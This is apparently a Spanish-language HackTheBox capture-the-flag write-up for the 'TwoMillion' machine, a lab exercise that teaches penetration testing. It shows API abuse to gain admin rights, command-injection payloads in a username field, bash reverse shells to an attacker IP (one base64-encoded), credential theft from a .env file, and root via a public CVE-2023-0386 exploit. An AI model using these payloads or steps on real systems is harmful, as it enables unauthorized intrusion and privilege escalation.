---
layout: post
title: "TwoMillion Writeup"
date: 2025-09-28
categories: [HackTheBox, Linux]
image: "/assets/images/twomillion.png"
description: "Resolviendo la máquina TwoMillion, Easy..."
---

Lo primero que hicimos fué un escaneo con nmap ![](/assets/images/writeups/1.png)

>Como se puede observar en la imagen, nos arrojó el dominio de la página, 2million.htb, por ende enviamos la ip de la máquina al hosts > `echo "10.10.11.221 - 2million.htb | sudo tee -a /etc/hosts` Esto nos permite entrar a la página desde el navegador sin necesidad de poner directamente la ip. 

Luego de entrar a la página, es una versión antigua de hack the box, en la cuál para poder logearnos, tenemos que "hackear" el código de invitación
![](/assets/images/writeups/{CEC42CC3-6BC1-4872-90EF-1D711CE712C3}.png)
Dónde la misma página nos dice que debemos hacer el challenge para logearnos.

Luego de que estamos en la página para entrar el código de invitación, abrimos las opciones de desarrollador del navegador, y encontramos algo interesante, un archivo llamado <span style="color: 7435F0;">inviteapi.min.js</span> el cuál si abrimos, vemos un código de javascript ofuscado, el cuál podemos desofuscar con [de4js](https://lelinhtinh.github.io/de4js/) solo tenemos que pegare código y darle a Auto decode. En seguida nos muestra el código desofuscado: 

```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

En el cuál la primera función es para verificar el código de invitación, mientras que la segunda es para generar el código de invitación, vemos la url `/api/v1/invite/how/to/generate` y hacemos una petición POST con `curl -X POST http://2million.htb/api/v1/how/to/generate`  y nos genera un código cesar:
![](/assets/images/writeups/Pasted image 20250928103619.png)
Este lo pasamos por la página [ROT13](https://rot13.com/) Y nos indica lo siguiente : `In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate` entonces hacemos un curl nuevamente a la dirección `/api/v1/invite/generate` 

- Esto nos lanza un código encriptado con base64 y lo descodificamos con `base64 -d`:
![](/assets/images/writeups/Pasted image 20250928105045.png)

- Listo, ese es el código de invitación para poder registrarnos en la web antigua de HTB, luego de registrarnos, nos logeamos con nuestro usuario y contraseña, para luego enumerar la página. 
- Nos vamos al apartado Access en el menú desplegable de la izquierda, al ver esta página, tenemos una opción de "connection pack" al ver lo que hace, nos descarga un archivo VPN, y si vemos el enlace, su ruta es `/api/v1/vpn/generate`
  hacemos un `curl -sv -X GET 2million.htb/api/v1 --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" | js-beautify ` con nuestra cookie que se puede conseguir en las opciones de desarrollador del navegador,
		al hacer el curl con nuestra cookie, nos muestra la siguiente información:
	![](/assets/images/writeups/Pasted image 20250928122356.png)
hacemos una petición al `/api/v1/admin/auth` con `curl 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" | js-beautify ` y esto nos muestra el mensaje en pantalla: `"message": false` el cuál nos está indicando que no somos administradores, luego al intentar con `curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p"` nos indica: `{"status":"danger","message":"Invalid content type."}` y no nos muestra un error de unathorized como antes, como ya sabemos, las API usan JSON para enviar y recibir datos, por lo que intentamos con el heade `--header "Content-Type: application/json"` , al hacer el curl con el header, nos da un error, pero no cualquier error. Está indicando que nos hace falta un parámetro: `{"status":"danger","message":"Missing parameter: email"}` el parámetro email, por lo que le enviaremos ese parámetro con `--data '{"email":"test@test.com"}'` siendo el `test@test.com` el email con el que nos registramos.

luego de aplicar el comando completo, ahora nos hace una pregunta, por decirlo de alguna forma; `"status":"danger","message":"Missing parameter: is_admin"` por lo que le pondremos el parámetro afirmando que si es admin, de la siguiente forma: `'{"email":"test@test.com","is_admin":'true'}'` al hacer esto, la web nos devuelve `{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}` entonces cambiamos la data que le estamos entrando por: `'{"email":"test@test.com","is_admin":'1'}'` el cuál nos devuelve con: `{"id":16,"username":"test","is_admin":1}` es decir, nos está indicando que somos admin.

para confirmar que somos admin, ejecutamos nuevamente el comando `curl 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" | js-beautify ` para ver que nos dice el mensaje, el cuál nos indicó la siguiente respuesta: `{"message":true}` por ende, ya somos admin en el user test.

luego de esto, intentamos en el apartado `/api/v1/vpn/generate` a ver que nos dice, siempre aplicando el header JSON: `curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" --header "Content-Type: application/json"` a lo que nos responde con: `{"status":"danger","message":"Missing parameter: username"}`, es decir, nos falta poner el username, simpmente poniendo:

`curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" --header "Content-Type: application/json" --data '{"username":"test"}'`

el cuál nos da una respuesta con los datos de la VPN , si esta VPN está siendo generada mediante PHP, podemos inyectar comandos maliciosos, para que nos devuelva con una cli, lo cual intentamos con: 
`curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" --header "Content-Type: application/json" --data '{"username":"test;id;"}'`

![](/assets/images/writeups/Pasted image 20250928130503.png)

- El cuál nos respondió correctamente al inyección. Luego de esto nos ponemos en escucha con netcat `nc -nlvp 9001` para obtener una shell:

```shell
curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" --header "Content-Type: application/json" --data '{"username":"test;bash -i >& /dev/tcp/10.10.14.183/9001 0>&1 | bash;"}'
```

- Al intentarlo de esa forma, no nos da la shell, por lo que intentamos codificando la inyección :
```shell
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvOTAwMSAwPiYxCg== | base64 -d | bash;"}'
```

- Y listo, tenemos una shell, navegando dentro de la máquina, podemos ver un usuario y contraseña, del user admin en la ruta `/var/www/html/.env`
- Nos logeamos mediante ssh `ssh admin@10.10.11.221` y ponemos la contraseña. Luego de entrar, cateamos la user.txt y obtenemos la flag user.

	Procedemos a limpiar nuestra terminal, lo podemos hacer poniendo el comando `export TERM=xterm` para poder hacer un ctrl+L, luego navengando hasta la ruta `/var/mail` nos encontramos con un archivo llamado admin, lo cateamos y nos muestro lo siguiente:
 
```bash

From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
```

el cuál nos da una idea de qué buscar... Buscando en google `OverlayFS / FUSE exploit` encontramos un repositorio en github con el [CVE-2023-0386](https://github.com/puckiestyle/CVE-2023-0386)  El cuál tiene un script hecho en C para convertirnos en root, mediante el SUID, este lo clonamos en nuestra máquina atacante haciendo un `git clone https://github.com/puckiestyle/CVE-2023-0386`, lo comprimimos con `zip -r cve.zip CVE-2023-0386` y en el mismo directorios que estamos, lanzamos un servidor simple con pyhthon `python3 http.server 8000` luego en la máquina vícitma ponemos el comando `wget http://10.10.14.183/cve.zip` y obtenemos el archivo, se descomprime, y luego de descomprimirlo entramos a la carpeta.

hacemos un `make all` y luego un `./fuse ./ovlcap/lower ./gc` para compilar el programa, ya que está hecho en lenguaje C, y por ende tenemos que compilarlo antes de ejecutarlo. Por último hacemos `./exp` y listo, ya samos root, la flag se encuentra en el directorio root.

Esto sería todo por esta máquina, esta máquina me ayudó bastante a saber enumerar, aprendí muchos conceptos que desconocía. Gracias por leer hasta aquí :) 

